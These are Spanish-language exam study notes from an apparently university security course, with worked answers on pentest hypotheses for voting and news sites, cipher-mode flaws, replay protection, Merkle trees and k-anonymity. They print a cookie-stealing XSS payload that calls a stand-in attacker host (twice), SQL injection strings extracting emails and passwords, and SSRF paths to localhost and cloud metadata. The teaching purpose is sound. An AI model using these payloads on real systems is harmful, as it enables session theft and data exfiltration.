- Los productores pueden revisar sus campañas creadas, donde pueden: ver la cantidad de votos de cada opción, descalificar opciones, o pausar la campaña (los votos que entren durante la pausa no se cuentan).
- El sistema de cobro es externo. Cada usuario paga una suscripción mensual que incluye hasta 10 campañas con hasta un millón de votos. Si se supera esa cantidad, se cobra un extra.

**Pregunta:**

Establecer 4 hipótesis de falla plausibles siguiendo la metodología de pentesting. Para cada hipótesis, definir una prueba concreta siguiendo los lineamientos de la metodología. No utilizar problemas genéricos; plantear situaciones y lugares concretos donde podría estar el problema.

**Hipótesis 1: Manipulación de votos a través del QR**

- **Qué:** Falsificación de códigos QR para inyectar votos masivos.
- **Por qué:** El sistema genera un QR por cada opción de voto que se envía por mail al productor. Si el QR simplemente contiene una URL como `GET /api/campania/{id}/opcion/{id}/votar`, cualquiera que conozca o deduzca la estructura de la URL puede generar votos sin escanear el QR original.
- **Cómo:** Se escanea el QR legítimo para ver la URL que contiene. Luego se automatiza un script que hace miles de requests a esa URL, simulando votos masivos para una opción específica. Se verifica si el sistema acepta los votos sin limitar por IP, dispositivo o algún mecanismo anti-bot.
- **Impacto:** Un atacante puede manipular los resultados de una votación televisiva, afectando la credibilidad del programa y del servicio de Votame SRL.

---

**Hipótesis 2: Broken Access Control en gestión de campañas**

- **Qué:** Un productor puede acceder y modificar campañas de otro productor.
- **Por qué:** Los productores acceden a una aplicación web donde pueden ver sus campañas, pausarlas y descalificar opciones. Si los endpoints de la API solo verifican que el usuario esté autenticado pero no que sea el dueño de la campaña, cualquier productor autenticado podría manipular campañas ajenas.
- **Cómo:** Un productor autenticado intercepta el request de pausar su propia campaña con un proxy, cambia el `id_campania` por el de otra campaña, y envía el request. También se prueba: `POST /api/campania/{id_ajeno}/descalificar_opcion/{id}` y `GET /api/campania/{id_ajeno}/resultados`.
- **Impacto:** Un productor competidor podría pausar campañas ajenas (anulando votos legítimos), descalificar opciones para alterar resultados, o espiar los resultados de campañas rivales.

---

**Hipótesis 3: Falsificación de confirmación de pago**

- **Qué:** Un productor obtiene el servicio sin pagar manipulando la respuesta del sistema de cobro externo.
- **Por qué:** El sistema de cobro es externo. Cuando el productor paga la suscripción, el sistema externo notifica al backend de Votame SRL (vía webhook o redirect). Si el backend no valida que la notificación realmente proviene del sistema de cobro, un atacante puede simularla.
- **Cómo:** El productor inicia el flujo de pago, intercepta la comunicación con un proxy (Burp Suite), y en lugar de completar el pago, envía directamente al backend una request simulando la confirmación exitosa. Se verifica si el backend habilita la suscripción sin pago real. También se prueba si se puede manipular el campo de cantidad de campañas o votos incluidos.
- **Impacto:** El productor usa el servicio sin pagar, o se asigna límites superiores a los de su suscripción (más de 10 campañas o más de un millón de votos sin costo extra).

---

**Hipótesis 4: XSS a través de las opciones de voto**

- **Qué:** Cross-Site Scripting almacenado en los nombres de las opciones de voto.
- **Por qué:** Al crear una campaña, el productor define las opciones de voto con texto libre. Estos nombres se muestran en la interfaz web cuando otros productores o administradores revisan las campañas. Si el input no está sanitizado, se puede inyectar JavaScript.
- **Cómo:** Un productor crea una campaña con una opción de voto llamada: `<script>fetch('<https://atacante.com/?cookie='+document.cookie>)</script>`. Si otro usuario o administrador ve esta campaña en la plataforma, el script se ejecuta en su navegador y envía su cookie de sesión al atacante.
- **Impacto:** El atacante roba sesiones de otros productores o administradores, pudiendo acceder a sus campañas, manipular resultados, o en el caso de un administrador, comprometer todo el sistema.

# 17-07-2023

## Ejercicio 1

Hay una empresa que se encarga de controlar el agua. Para esto, la empresa implementa unos dispositivos encargados de hacer las respectivas mediciones. Los mismos le informan a la central los datos recolectados.

El procedimiento cuando se pone un dispositivo es el siguiente:

Primero el dispositivo emite su ID por broadcast, luego la central responde a ese ID y le envía una llave por HTTP. Cuando el dispositivo le debe enviar lo recolectado a la empresa, usa AES-ECB como método de encripción.

La empresa contrata una auditoría y le dice que posee fallas en la comunicación de la llave y problemas de integridad en la comunicación de los dispositivos.

1. Usando HTTPs se hubieran solucionado todos los problemas que informó la auditoría?
    
    1. DISP_i → broadcast: id_dispositivo_i (broadcast)
        
    2. CENTRAL → DISP_i: key_i (del dispositivo, por http)
        
    3. DISP_i → EMPRESA: AES-ECB_key_i_{datos}
        
        HTTPS soluciona el problema de la comunicación de la clave: cifra el canal entre la central y el dispositivo, evitando que un atacante intercepte la key en tránsito (MITM).
        
        Pero HTTPS **no soluciona** el problema de integridad en la comunicación dispositivo → empresa, porque esa comunicación usa AES-ECB, que tiene dos problemas:
        
        - **AES-ECB no provee integridad.** Es solo cifrado, sin MAC ni autenticación. Un atacante puede modificar bloques cifrados sin que se detecte.
        - **AES-ECB no es CPA-secure.** Bloques iguales de texto plano producen bloques iguales de texto cifrado, lo que filtra patrones en los datos.
        
        HTTPS protege el canal de distribución de claves, pero el canal dispositivo → empresa sigue usando AES-ECB que no da integridad.
        
2. En caso de no poder usar HTTPs por cuestiones de presupuestos, ¿qué otro protocolo utilizaría para el intercambio de claves?
    
    Usar un protocolo de intercambio de claves con la central como KDC (Key Distribution Center). La central ya conoce los dispositivos (les responde por ID), así que puede actuar como tercero de confianza.
    
    Opción 1 — Si los dispositivos tienen capacidad asimétrica:
    
    `Diffie-Hellman autenticado o Needham-Schroeder con clave pública`
    
    Opción 2 — Si solo tienen capacidad simétrica (más probable para sensores):
    
    Cada dispositivo viene de fábrica con una clave pre-compartida con la central (k_i). La central usa esa clave para enviar la clave de sesión de forma segura:
    
    `DISP_i → CENTRAL: id_dispositivo_i CENTRAL → DISP_i: Enc_{k_i}(key_sesion || timestamp || MAC_{k_i}(key_sesion || timestamp))`
    
    El dispositivo descifra con k_i (que solo él y la central conocen), verifica el MAC y el timestamp, y usa key_sesion para comunicarse con la empresa.
    
3. ¿Qué cambios son necesarios para asegurar la integridad en el envío de información de los dispositivos hacia la central?
    
    **Reemplazar AES-ECB por AES-GCM (o AES-CCM).**  
    AES-ECB solo provee cifrado (y malo, porque no es CPA-secure). AES-GCM es cifrado autenticado: provee confidencialidad e integridad en una sola operación.
    
    Si no se puede cambiar el algoritmo (por limitaciones del hardware), la alternativa es agregar un MAC independiente:
    
    `DISP_i → EMPRESA: AES-ECB_{key_i}(datos) || HMAC_{key_mac}(datos)`
    
    Usando una clave de MAC independiente de la clave de cifrado (usar la misma clave para cifrado y MAC no es CCA-secure).
    

## Ejercicio 2

Se quiere ocultar un mensaje de forma segura con una técnica similar a las sombras. Dado un mensaje “m” se eligen dos números random (x1, x2) y se generan por dos canales separados (posiblemente en lugares distintos):

- p1 = x1 xor m xor x2
- p2 = x2 xor x1
- p1 y h(p2) — Canal 1
- p2 y h(p1) — Canal 2

1. Explicar por qué si un atacante tiene acceso a solo 1 canal de comunicación aún se mantiene la confidencialidad
    
    Si tiene acceso al canal 1: tiene acceso a p1 y h(p2) → no puede sacar p2 porque una función hash no es invertible, y tampoco puede sacar p1 porque no conoce los dos numeros random x1 y x2 con los que están xoreados la m
    
    Si tiene acceso al canal 2: tiene acceso a p2 y h(p1) → lo mismo
    
    La confidencialidad se mantiene pues el acceso al valor hasheado no revela ningun información, y ambas p’s están xoreados por 2 números random
    
2. Explicar por qué si un atacante tiene acceso a un solo canal de comunicación aún se mantiene la **integridad**
    
    Si tiene acceso al canal 1 y alguien falsifica el valor de p1 cuando luego reciba h(p1) va a saber que no coinciden por la propiedad de resistencia a segundas preimagenes (no existe p1’ ≠ p1 tq h(p1’)=h(p1))
    
3. Si un atacante tiene acceso a los 2 canales de información, cómo hacer para que se mantenga solo la integridad
    
    Reemplazar el hash por **HMAC** con una clave secreta k compartida:
    
    `Canal 1: p1 y HMAC_k(p2) Canal 2: p2 y HMAC_k(p1)`
    
    El atacante tiene ambos canales, ve p1, p2, HMAC_k(p2) y HMAC_k(p1). Puede calcular m = p1 xor p2 (confidencialidad rota, pero la pregunta acepta eso — dice "mantener SOLO integridad"). Pero si quiere modificar p1 → p1', necesita recalcular HMAC_k(p1') para reemplazarlo en el canal 2. No puede porque no conoce k.
    

## Ejercicio 3

Una página de noticias en la que hay un usuario y un generador de noticias. A cada noticia se le puede poner etiquetas como categorías (Deportes, Interés general) o Ubicación (Argentina).

Cada usuario lleva un puntaje (+1 por cada noticia rateada positivamente y -1 por cada noticia rateada negativamente).  La página tiene una API REST y los llamados a la misma se hacen por HTTPS.

Se le pagará por visualizaciones al generador de la noticia teniendo en cuenta algunos factores que no me acuerdo pero no venían al caso.

Se hizo un análisis de la página y se encontró que:

1. Existe una URL para pedir todas las noticias `https://dominio.com/news limit=100&page=20`
2. Cuando se le recomienda o no recomienda una noticia se hace a través de `https://dominio.com/{generator_id}/{news_id}/upvoted` o `https://dominio.com/{generator_id}/{news_id}/downvoted`
3. Las personas se registran por usuario y password
4. Se chequearon los inputs de la página y cualquier intento de tag HTML ingresado aparecerá como texto en la página

_**Establecer 4 hipótesis de falla con las respectivas pruebas que haría**_

1. **SQL Injection en los parámetros de búsqueda de noticias**
    
    **Hipótesis:** La URL `https://dominio.com/news?limit=100&page=20` tiene parámetros que probablemente se traducen en una query SQL tipo `SELECT * FROM noticias LIMIT 100 OFFSET 2000`. Si estos parámetros no están **parametrizados**, un atacante puede inyectar SQL para extraer datos que no deberían ser públicos, como datos de usuarios, contraseñas, o información de pagos a generadores.
    
    **Prueba:** Con un proxy (Burp Suite), interceptar el request y modificar los parámetros:
    
    `/news?limit=100&page=20 UNION SELECT email, password FROM usuarios; --`
    
    Como prueba menos intrusiva:
    
    `/news?limit=100&page=20' OR '1'='1`
    
    Si devuelve más resultados de los esperados o datos de otras tablas, la hipótesis se confirma.
    
2. **Broken Access Control — Manipulación de votos a través de IDs en la URL**
    
    **Hipótesis:** La URL de votación `/{generator_id}/{news_id}/upvoted` expone los IDs directamente. Si el servidor solo verifica que el usuario esté autenticado pero no valida la coherencia de los parámetros, un atacante puede manipular los votos de múltiples formas:
    
    - Cambiar `news_id` para votar noticias que no leyó
    - Repetir el request muchas veces para inflar el puntaje de un generador (y por lo tanto sus ingresos por visualizaciones)
    - Cambiar `upvoted` por `downvoted` para bajar el puntaje de un competidor
    - Automatizar requests para votar masivamente todas las noticias de un generador específico
    
    **Prueba:** Loguearse como usuario normal e interceptar el request de upvote con Burp Suite. Primero, cambiar el `news_id` por el de otra noticia y verificar si el servidor acepta el voto sin validar que el usuario haya visto esa noticia. Luego, reenviar el mismo request de upvote 10 veces con el repeater de Burp y verificar si el servidor acepta votos duplicados del mismo usuario para la misma noticia.
    
3. **DoS por manipulación del parámetro limit**
    
    **Hipótesis:** El parámetro `limit` en la URL de noticias controla cuántos resultados devuelve la query. Si el servidor no valida ni limita este valor server-side, un atacante puede enviar `limit=999999999` forzando al servidor a procesar y devolver una cantidad masiva de registros, saturando la base de datos, la memoria del servidor y el ancho de banda.
    
    **Prueba:** Enviar requests con valores crecientes de limit y observar el comportamiento:
    
    `/news?limit=1000&page=1 /news?limit=100000&page=1 /news?limit=999999999&page=1`
    
    No enviar más de 2-3 requests para no causar daño real. Si el servidor responde a todos sin rechazar ni limitar, la hipótesis se confirma. Verificar también si el endpoint requiere autenticación — si es público, cualquiera puede hacer este ataque.
    
4. **Improper Authentication — Falta de política de contraseñas y rate limiting**
    
    **Hipótesis:** El sistema requiere registro con usuario y contraseña, sin mención de MFA, política de contraseñas, ni limitación de intentos. Esto es particularmente grave porque hay incentivo económico (se paga por visualizaciones), lo que motiva a un atacante a tomar control de múltiples cuentas para inflar votos. Si el sistema acepta contraseñas débiles y no limita intentos de login, un atacante puede hacer fuerza bruta o diccionario para obtener acceso a cuentas de otros usuarios y usarlas para votar masivamente.
    
    **Prueba:** Primero, intentar registrarse con contraseñas débiles como "123456" o "password". Si el sistema las acepta, la política es insuficiente. Luego, realizar 20 intentos de login con contraseñas incorrectas para verificar si hay rate limiting o bloqueo de cuenta. Si no hay restricción, un ataque por diccionario es viable.
    

# 20-12-2023

## Ejercicio 1

Una franquicia de bingos decide crear una aplicación que simule un bingo virtual donde los participantes paguen y obtengan dinero real.

Cada juego tiene un valor de ingreso, y le permite al participante obtener un cartón con 15 números elegidos al azar entre 1 y 90. Cuando comienza el juego, el servidor comienza a "sacar" números, y los participantes deben ir marcando los números en su cartón si corresponde.

Cuando uno de los participantes completa los 15 números de su cartón, selecciona el botón "bingo", y si realmente salieron todos, gana el premio de esa jugada y termina la partida para todos. Si no fuese así, se le avisa y se lo descalifica.

Resuelta la seguridad de los aspectos de introducir y retirar dinero se identificaron tres funcionalidades necesarias respecto a la dinámica del juego. Explicar cómo se podría lograr cada una recurriendo a funciones criptográficas **simétricas** solamente, justificando la elección. De ser necesario, explicar que información se intercambia en cada momento entre las apps y el servidor.

_**a) El servidor debe generar una secuencia de números entre 1 y 90, que luego pueda ser reproducida por los clientes al finalizar la partida (para garantizar que no se favoreció adrede a alguien en el sorteo) (1 pto.)**_

Antes de empezar la partida, el servidor selecciona aleatoriamente 15 numeros entre 1 y 90 (todos distintos) y los cifra con una clave.

_**b) Los cartones se crean en las apps cliente al inicio de la partida. El servidor no conoce los cartones hasta el momento de verificar un bingo, pero debe ser posible para el servidor verificar que el cartón no fue modificado una vez empezado el juego (para evitar que un jugador arme el cartón ideal para ganar luego de 15 números). (1 pto.)**_

Verificar que carton no fue modificado → integridad

_**c) La app de cada participante deberá poder verificar si el ganador realmente completó el bingo y emitir una alerta en caso contrario (para evitar que el servidor de por ganador a alguien que no completó el cartón). Las apps no se comunican entre si, sino a través del servidor. (1 pto.)**_

Nota: Considerar que hay aproximadamente 2^55 cartones (combinatoria de 90 tomados de a 15), y asumir que un atacante podría llegar a probar esa cantidad de combinaciones.

# 10-07-2023

## Ejercicio 1

Una empresa tiene un sistema donde hay varios sensores que comunican a un dispositivo maestro sus diferentes niveles de sensado. Intercambian claves con Diffie-Helman en su primera comunicación, y a partir de eso en todos los mensajes que los sensores envían (encriptados con AES-CBC) tienen la siguiente estructura:

$$  
\#sensor||e_{k}(\#sensor||valor\_sensado||datos\_adicionales)  
$$

1. Hay un atacante que hace de alguna forma que los mensajes se alteren y tengan datos adicionales no validos, generando que el dispositivo maestro tire una señal de alerta. Cómo es posible? Encontrar una manera de solucionar este error en el protocolo sin nuevas claves. (1,5 puntos)
    
    AES-CBC es CPA-secure pero no provee integridad. Un atacante puede realizar un ataque de **bit-flipping** sobre el ciphertext. En CBC, si el atacante modifica bits del bloque cifrado c_i, ocurre lo siguiente:
    
    - El bloque m_i queda como basura (descifrado inválido)
    - El bloque m_{i+1} sufre un bit-flip predecible en las mismas posiciones que el atacante modificó en c_i
    - Los bloques m_{i+2} en adelante quedan perfectos
    
    En este caso, el atacante puede modificar bits del bloque cifrado correspondiente a `valor_sensado` o `datos_adicionales` de forma predecible, generando valores inválidos que hacen que el dispositivo maestro lance una alerta falsa. El atacante no necesita conocer la clave ni descifrar nada — solo necesita modificar bits del ciphertext en tránsito.
    
    **La solución — Cambiar a AES-GCM:**
    
    El enunciado dice "sin nuevas claves". Usar un MAC separado requeriría una clave independiente de la de cifrado (porque cifrar y hacer MAC con la misma clave no es CCA-secure). Como no podemos agregar claves nuevas, la solución es cambiar a **AES-GCM**, que provee cifrado autenticado (confidencialidad + integridad) con una sola clave, ya que deriva internamente las claves de cifrado y autenticación.
    
    Con AES-GCM, si el atacante modifica cualquier bit del ciphertext, la verificación de autenticidad falla y el dispositivo maestro descarta el mensaje en lugar de generar una alerta falsa.
    
    La estructura del mensaje quedaría:
    
    `#sensor || EncGCM_k(#sensor || valor_sensado || datos_adicionales)`
    
2. Hay otro atacante que está enviando repetidamente la señal de sensado de un sensor, haciendo que el dispositivo maestro registre niveles de sensado que no son correctos. Cómo es posible? Encontrar una forma de modificar el mensaje para que esto no ocurra sin usar nuevas claves. (1,5 puntos)
    
    El atacante captura un mensaje legítimo completo enviado por un sensor y lo reenvía repetidamente al dispositivo maestro. Como el mensaje es auténtico (fue generado por el sensor con la clave correcta), incluso AES-GCM lo aceptaría como válido. El dispositivo maestro registra niveles de sensado que no corresponden a la realidad.
    
    Se agrega un número de secuencia (**counter**) al mensaje. El counter va tanto dentro del cifrado como fuera, para que el dispositivo maestro pueda verificarlo antes de descifrar:  
    `#sensor || counter || EncGCM_k(#sensor || counter || valor_sensado || datos_adicionales)`
    
    El sensor incrementa el counter con cada mensaje enviado. El dispositivo maestro guarda el último counter recibido de cada sensor y al recibir un mensaje:
    
    1. Lee el counter en plano y verifica que sea estrictamente mayor al último registrado para ese sensor
    2. Si es igual o menor, rechaza el mensaje (replay detectado)
    3. Si es mayor, verifica la autenticación de GCM y descifra
    4. Compara el counter de afuera con el de adentro para asegurar que no fue manipulado
    
    **¿Por qué funciona?** Si el atacante reenvía un mensaje viejo, el counter será igual o menor al último registrado y será rechazado. Y el atacante no puede modificar el counter externo para incrementarlo porque la autenticación de AES-GCM detectaría que el counter interno no coincide con el externo.
    

## Ejercicio 2

Se quiere enviar un conjunto de datos muy grande. Si bien se puede mandar la información junto con un MAC de la información entera, en caso de que una parte del mensaje tenga un error, es necesario mandar el mensaje entero de vuelta. Se buscan alternativas para MAC, donde se parte la data en bloques más pequeños, de forma que permitan no tener que enviar la información entera en caso de una falla en uno de los bloques. Las alternativas son las siguientes:

1. En vez de calcular el MAC de cada bloque, se calcula el MAC’ que es: el contenido del bloque anterior concatenado al MAC del bloque actual. Excepto en el bloque cero, que como no tiene anterior, se ponen 0s. (1 punto)
2. Se calcula el MAC de la concatenación de los MAC de cada bloque. (1 punto)
3. Se calcula el MAC usando el árbol de Merkle (buscar ejemplo de arbol de Merkle). (1 punto)

Para cada caso evaluar si tiene integridad y en caso de que sí, cómo harían cuando un bloque se envía con un dato erróneo (si es que hay una alternativa a no enviar todo el mensaje de vuelta)

**Opción 1: MAC encadenado — ❌ NO tiene integridad**

`MAC'_1 = 0…0 || MAC(bloque_1) MAC'_2 = MAC'_1 || MAC(bloque_2) MAC'_3 = MAC'_2 || MAC(bloque_3)`

No tiene integridad porque es vulnerable a un ataque de truncamiento. Un atacante puede eliminar bloques del final del mensaje y el receptor no lo detectaría. Por ejemplo, si el mensaje tiene 5 bloques, el atacante envía solo los bloques 1, 2, 3 con sus MAC' correspondientes. El receptor verifica cada MAC' y todos dan válido — no hay nada que indique que faltan los bloques 4 y 5. Cada MAC' es independiente del futuro, solo depende del bloque anterior.

---

**Opción 2: MAC de MACs — ✅ SÍ tiene integridad**

`MAC_final = MAC(MAC(bloque_1) || MAC(bloque_2) || ... || MAC(bloque_n))`

Tiene integridad porque el MAC final depende de todos los bloques. Si se modifica, agrega o elimina cualquier bloque, el MAC final cambia y el receptor lo detecta.

**Problema:** si un bloque tiene error, no se puede identificar directamente cuál es. Hay que recalcular el MAC de cada bloque individualmente y comparar con los originales para encontrar el bloque erróneo. Esto es O(n) — hay que revisar todos los bloques. Además, hay que reenviar todo el mensaje porque el MAC final cambia al corregir cualquier bloque.

---

**Opción 3: Árbol de Merkle — ✅ SÍ tiene integridad + identifica el bloque erróneo en O(log n)**

Tiene integridad porque la raíz del árbol depende de todos los bloques. Cualquier modificación se propaga hacia arriba y cambia la raíz.

**Ventaja:** para encontrar el bloque con error, se recorre el árbol desde la raíz hacia abajo:

1. La raíz no coincide → hay un error
2. Se comparan los dos hijos de la raíz → se identifica en qué mitad está el error
3. Se baja por esa rama y se repite
4. En O(log n) comparaciones se llega al bloque exacto con error

Solo hay que reenviar el bloque erróneo y los hashes del camino desde ese bloque hasta la raíz (O(log n) datos), en lugar de todo el mensaje.

## Ejercicio 3

Se tiene una página de noticias donde hay usuarios que pueden _ratear_ una noticia positiva o negativamente. Los publicadores de noticias pueden subir noticias pegándola a una API REST. Los usuarios interactúan con la página a través de una página web que se comunica con la API. Los ingresos de las publicidades de las noticias se pagan a los creadores según la cantidad de visitas que tiene una noticia.  
Se encontraron 4 vulnerabilidades:

1. Para evaluar la positividad de una noticia, los usuarios tocan un botón que hace un `GET` a `/{news_id}/positive` o `/{news_id}/positive/negative` , pero se encontró que se puede hacer **SSRF** a través de esto.
2. El contenido de una noticia se _postea_ tal cual como se recibe, sin hacer validaciones.
3. Las cookies de sesión no son `http_only`, y se pueden acceder a través de _javascript_.
4. Un publicador de noticia hace un llamado al _backend_ con una API KEY que se introduce en el pedido de la siguiente forma: `/api/{API_KEY}/publish`

a) Explicar como podría un atacante sumarse dinero de forma maliciosa con los puntos 2 y 3. (1,5 puntos)

La cadena de ataque es:

1. El atacante es un publicador de noticias. Publica una noticia cuyo contenido incluye un script malicioso: `<script>fetch('<https://atacante.com/?cookie='+document.cookie>)</script>`. Esto es posible porque el contenido se postea tal cual sin validaciones (punto 2).
2. Cuando cualquier usuario visita esa noticia, el script se ejecuta en su navegador. Como las cookies no son http_only (punto 3), el script accede a la cookie de sesión y la envía al servidor del atacante.
3. Con las cookies robadas, el atacante puede hacerse pasar por múltiples usuarios. Usando esas sesiones, genera visitas artificiales a sus propias noticias — cada visita con una sesión distinta cuenta como un usuario diferente visitando la noticia.
4. Como los ingresos de publicidad se pagan según la cantidad de visitas, el atacante cobra más dinero por las visitas artificiales generadas con las sesiones robadas.

b) Explicar cómo tomaría ventaja un atacante de la vulnerabilidad 1. (1,5 puntos)

El endpoint `GET /{news_id}/positive` toma el `news_id` y el servidor lo procesa internamente. En un ataque SSRF, el atacante manipula ese parámetro para que el servidor haga requests a recursos internos.

Por ejemplo, el atacante envía:

`GET /<http://localhost:8080/admin/positive`>

o

`GET /<http://169.254.169.254/metadata/positive`>

El servidor, en lugar de buscar una noticia, hace un request a esa URL interna. Esto le permite al atacante:

- Acceder a paneles de administración internos (`localhost:8080/admin`)
- Acceder a metadatos de la infraestructura cloud (`169.254.169.254`)
- Escanear puertos y servicios de la red interna
- Potencialmente acceder a bases de datos o servicios que no están expuestos al público

Todo esto es posible porque el servidor no valida que el `news_id` sea un identificador válido antes de procesarlo.

c) Explicar por qué es inseguro que se envíen las API KEYS como lo indica el punto 4 e indicar cómo lo corregirían (1 punto)

Enviar la API key en la URL (`/api/{API_KEY}/publish`) es inseguro porque la URL queda expuesta en múltiples lugares:

1. **Logs del servidor:** los servidores web registran todas las URLs de los requests, por lo que la API key queda en texto plano en los logs.
2. **Historial del navegador:** la URL completa se guarda en el historial, visible para cualquiera con acceso al dispositivo.
3. **Header Referer:** si la página redirige a otro sitio, el navegador envía la URL anterior en el header Referer, filtrando la API key a terceros.

**Corrección:** La API key debe enviarse en un header HTTP, por ejemplo:

`X-API-KEY: {clave}`o`Authorization: Bearer {clave}`

Los headers no se guardan en logs por defecto, no aparecen en el historial del navegador ni en el Referer. Además, combinado con HTTPS, los headers viajan cifrados en tránsito.

# 06-12-2023

## **Ejercicio 1**

Considerar una BD de emails que han sido utilizados para publicidad no deseada (SPAM) y un servicio que permite a cualquier persona consultar si su email está en la lista. La consulta misma le da al dueño del sistema acceso a nuevos emails que podrían ser vendidos, robados, o utilizados sin consentimiento.

El servicio pretende mantener el anonimato de la información, en el sentido de no poder asociar un email particular a un usuario que usa el mismo. Para ello se decidió implementar un mecanismo conocido como **k-anonymity**, que establece la imposibilidad de asociar un dato a una entidad discernible en un grupo de al menos k entidades:

El servicio guarda en su BD el resultado de aplicar un hash criptográfico SHA-256 sobre cada email. Un cliente que quiera hacer una búsqueda, calcula localmente el hash del email a consultar y enviar solo los primeros x bits del hash (donde x es una constante definida como parte del servicio), recibiendo como respuesta todos los hashes de la BD que tengan dicho prefijo. De esta manera el usuario puede buscar si aparece su hash completo en la respuesta y responder la pregunta.

1. Mejora la seguridad si se utiliza SALT de 256 bits para almacenar los hashes? ¿Tiene alguna otra consecuencia? Aclaración: seguridad en este contexto refiere al modelo o anonimato deseado. (1 pto)
    
    No, no mejora la seguridad y de hecho **rompe la funcionalidad del esquema completo.** El salt hace que el hash sea no determinístico: para un mismo email, cada vez que se aplica SHA-256 con un salt distinto, el resultado es diferente. Es decir, `SHA-256(salt || email)` produce un hash distinto para cada valor de salt.  
    Esto genera dos problemas:
    
    1. **El cliente no puede consultar:** Para calcular el hash de su email y enviar el prefijo, el cliente necesitaría conocer el salt que el servidor usó al almacenar ese email. Pero el cliente no tiene acceso al salt, por lo que no puede reproducir el mismo hash y la consulta no devolvería resultados útiles
    2. **La comparación deja de funcionar:** Incluso si el servidor devolviera hashes con el prefijo solicitado, el hash completo que calculó el cliente (sin salt o con otro salt) nunca coincidiría con el almacenado en la BD. El usuario no podría determinar si su email está en la lista o no.  
        En resumen, el salt es una técnica útil para proteger contraseñas almacenadas (donde el servidor conoce el salt y hace la comparación internamente), pero en este esquema de k-anonymity donde el **cliente** es quien debe calcular y comparar los hashes, el salt destruye la funcionalidad sin aportar ninguna mejora en anonimato.
2. Explicar por qué alguien que controla el servidor no puede saber ni cual era el email sobre el qué preguntó el usuario, ni si el resultado de la búsqueda fue exitoso o no. (1 pto)
    
    Hay dos razones:
    
    1. **Resistencia a preimagen de SHA-256:** El servidor recibe solo los primeros x bits de un hash SHA-256. Aunque quisiera, no puede invertir el hash para descubrir qué email lo produjo. SHA-256 es resistente a preimagen: dado un hash (o un prefijo de hash), es computacionalmente inviable encontrar el mensaje original que lo generó.
    2. **k-anonymity por prefijo:** Los primeros x bits del hash coinciden con al menos k emails distintos en la base de datos. El servidor devuelve todos esos k hashes al cliente, pero no tiene forma de saber cuál de ellos es el que el cliente está buscando. Desde la perspectiva del servidor, el cliente podría estar consultando por cualquiera de esos k emails con igual probabilidad (1/k).
    
    Además, el servidor tampoco puede saber si la búsqueda fue exitosa o no, porque la comparación final (verificar si el hash completo del email está en la lista de resultados) la hace el **cliente localmente**. El servidor nunca recibe el hash completo, solo el prefijo. No tiene forma de saber si alguno de los k hashes devueltos coincidió con el email del cliente.
    
    En resumen: la resistencia a preimagen impide invertir el hash, el prefijo corto impide identificar el email específico, y la comparación local impide saber el resultado de la búsqueda.
    
3. Con qué criterio se puede definir el valor x (la cantidad de bits de prefijo que debe enviar el cliente) si queremos garantizar 256-anonymity? (1 pto)
    
    El valor x determina cuántos bits del hash envía el cliente como prefijo. Con x bits de prefijo, los hashes de la BD se dividen en 2^x grupos. Asumiendo distribución uniforme de SHA-256, cada grupo contiene aproximadamente `|BD| / 2^x` hashes.
    
    Para garantizar k-anonymity, necesitamos que cada grupo tenga al menos k elementos:
    
    `|BD| / 2^x ≥ k`
    
    Despejando x:
    
    `x ≤ log₂(|BD| / k)`
    
    Para 256-anonymity:
    
    `x ≤ log₂(|BD| / 256)`
    
    Si x es menor, los grupos son más grandes y hay más anonimato (pero la respuesta del servidor es más pesada). Si x es mayor, los grupos son más chicos y se pierde anonimato (pero la respuesta es más liviana). Es un trade-off entre **anonimato y eficiencia**.
    

## **Ejercicio 2**

Un oleoducto es una tubería que transporta petróleo a grandes distancias (a veces miles de kilómetros). Dada la longitud, la dificultad de acceso en segmentos soterrados y el costo de no poder utilizarlo, el diseño incluye un sistema de control activo que permite identificar problemas en el transporte con una localización precisa de donde ocurre el problema.

Cada 200m se emplazan un conjunto de sensores dentro del oleoducto que monitorean la presión y algunas características químicas que permiten estimar problemas como una fuga o contaminación. Estos sensores están conectados físicamente con un cableado interno, y cada 10 km hay concentradores, que son dispositivos externos a la tubería, que están conectados tanto al segmento anterior como al posterior y recopilan la información. Los concentrados transmiten por radiofrecuencia los resultados a una central, donde son analizados para generar alarmas cuando sea necesario (por ejemplo, si falta información de algún sensor).

Dado el valor del material transportado, un escenario de ataque contemplado incluye a un grupo con acceso a tecnología sofisticada, capaz de tomar control físicamente de un concentrador y manipularlo, con el objetivo de “pinchar” un tubo y extraer petróleo en pequeñas cantidades (algunos camiones por día) para comercializarlo por canales no oficiales.

Cada grupo de sensores tiene un identificador único público de 128 bits, un identificador único privado de 128 bits (que puede ser utilizado, por ejemplo, como clave, pero nunca es transmitido). Los sensores siguen un modelo de transmisión simple estilo token-ring para hacer uso del cable que los conecta, y cuando es su turno, transmiten un par (identificador, enc(valor_sensado)), utilizando CHACHA20 como función de cifrado de flujo.

Los concentradores cuentan con su propio par de identificadores, pero solo la central conoce los identificadores privados del resto. Cada concentrador captura los mensajes transmitidos por cada sensor durante 1 minuto, tanto de la sección anterior como la posterior del dispositivo, y las envía en un único mensaje de la forma (identificador, msg1|msg2|...|msgn, mac(msg1|msg2|...|msgn)), utilizando para el mac su identificador privado y la función hmac-sha3.

**Nota**: a|b significa a seguido de b.

1. Explicar qué debe hacer la central para verificar la integridad de los valores de cada sensor que recibió, antes de determinar si sus valores son normales o no (1 pto).
    
    **1. Verificar el MAC del concentrador:**  
    La central recibe el mensaje `(identificador_concentrador, msg1|msg2|...|msgn, mac(msg1|msg2|...|msgn))`. Usando el identificador privado del concentrador (que la central conoce), verifica el HMAC-SHA3 para confirmar que el mensaje no fue alterado en tránsito entre el concentrador y la central. Si el MAC no es válido, descarta el mensaje.
    
    **2. Descifrar los valores de cada sensor:**  
    Para cada msg_i = `(identificador_sensor, enc(valor_sensado))`, la central busca el identificador privado de ese sensor y descifra el valor sensado usando CHACHA20. Además, verifica que el identificador del sensor exista y corresponda a un sensor legítimo del segmento que cubre ese concentrador.
    
    **3. Validar los valores descifrados:**  
    Como CHACHA20 es un cifrado de flujo y no provee integridad, la central no puede garantizar criptográficamente que los valores no fueron manipulados. Sin embargo, puede validar que los valores descifrados sean coherentes:
    
    - Que los valores de presión y características químicas estén dentro de rangos físicamente posibles
    - Que no falte información de ningún sensor (el enunciado menciona esto como criterio de alarma)
    - Que los valores sean consistentes con los de sensores vecinos (una anomalía aislada en un solo sensor podría indicar manipulación)
    
    Si al descifrar se obtiene basura o valores fuera de rango, la central sabe que algo fue manipulado y genera una alarma.
    
